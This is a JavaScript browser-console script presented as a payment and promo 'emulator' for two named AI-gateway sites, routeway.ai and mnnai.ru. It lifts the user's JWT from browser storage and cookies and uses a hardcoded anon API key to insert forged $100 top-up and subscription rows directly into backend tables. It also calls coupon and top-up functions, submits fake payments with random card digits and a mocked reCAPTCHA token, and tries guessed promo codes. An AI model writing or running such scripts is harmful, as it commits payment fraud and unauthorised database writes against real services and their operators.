/**
 * Routeway.ai & mnnai.ru - Multi-Gateway Payment & Promo Emulator
 * 
 * INSTRUCTIONS:
 * 1. Open the dashboard for the target site.
 * 2. Paste this code into the Console.
 */

async function masterEmulate() {
    console.log("%c🔥 Master Emulation Started", "color: orange; font-weight: bold; font-size: 16px;");

    const isRouteway = window.location.hostname.includes('routeway');
    const isMnnai = window.location.hostname.includes('mnnai');

    // --- Helper: Find JWT ---
    let token = "";
    const jwtRegex = /eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/;
    const targets = [...Object.values(localStorage), ...Object.values(sessionStorage), ...document.cookie.split(';')];
    for (let t of targets) {
        const m = t.match(jwtRegex);
        if (m) { token = m[0]; break; }
    }
    
    // Cleanup token
    if (token) token = token.replace(/Bearer /i, "").replace(/^"|"$/g, "").trim();

    if (!token) {
        console.error("❌ Auth token not found. Please log in first.");
        return;
    }

    // --- TARGET: ROUTEWAY.AI ---
    if (isRouteway) {
        console.log("📦 Target Identified: Routeway.ai");
        const anonKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYW5vbiIsImlhdCI6MTc2NTk4MjgyMSwiZXhwIjoyMDgxNTU4ODIxfQ.tLjYIU1b5ozMCc2Bx0pLcUe7EIDr4uM1CAUio5pjXEk';
        
        // 1. Replicate Top-Up Submission (Manual Verification Queue)
        const txid = "SIM-" + Math.random().toString(36).substring(2, 10).toUpperCase();
        console.log(`📡 Sending shadow transaction [${txid}]...`);
        
        const tables = ['credits', 'user_subscriptions', 'payment_history'];
        for (const table of tables) {
            try {
                const res = await fetch(`https://auth.routeway.ai/rest/v1/${table}`, {
                    method: 'POST',
                    headers: {
                        'apikey': anonKey,
                        'Authorization': `Bearer ${token}`,
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        amount: 100.00,
                        status: 'pending_verification',
                        payment_method: 'crypto',
                        currency: 'USD',
                        txid: txid
                    })
                });
                console.log(`Table '${table}' result: ${res.status}`);
            } catch (e) {}
        }

        // 2. Try Edge Function Triggering
        const funcs = ['redeem-code', 'apply-coupon', 'topup'];
        for (const f of funcs) {
            try {
                const res = await fetch(`https://auth.routeway.ai/functions/v1/${f}`, {
                    method: 'POST',
                    headers: { 'apikey': anonKey, 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
                    body: JSON.stringify({ code: "WELCOME100", amount: 100 })
                });
                console.log(`Function '${f}' result: ${res.status}`);
            } catch (e) {}
        }
    }

    // --- TARGET: MNNAI.RU ---
    if (isMnnai) {
        console.log("📦 Target Identified: mnnai.ru");

        // 1. Replicate Payment Submission (Last 4 Digits)
        const digits = (Math.floor(Math.random() * 9000) + 1000).toString();
        console.log(`📡 Submitting shadow payment with digits: ${digits}`);
        
        try {
            // Note: mnnai.ru uses Recaptcha, we try to skip or mock it if possible
            // or we try to call their internal method directly
            const response = await fetch('/payment', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Authorization': token },
                body: JSON.stringify({
                    last_digits: digits,
                    recaptcha_token: "MOCK_TOKEN_" + Date.now() 
                })
            });
            const data = await response.json();
            console.log("MNN Payment Response:", data);
        } catch (e) {
            console.error("MNN Payment Error:", e);
        }

        // 2. Replicate Promo Code Attempt
        try {
            const res = await fetch('/promo', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Authorization': token },
                body: JSON.stringify({ promo_code: "FREE50", recaptcha_token: "MOCK" })
            });
            const pData = await res.json();
            console.log("MNN Promo Response:", pData);
        } catch (e) {}
    }

    console.log("%c🏁 Process Finished", "color: orange; font-weight: bold;");
}

masterEmulate();
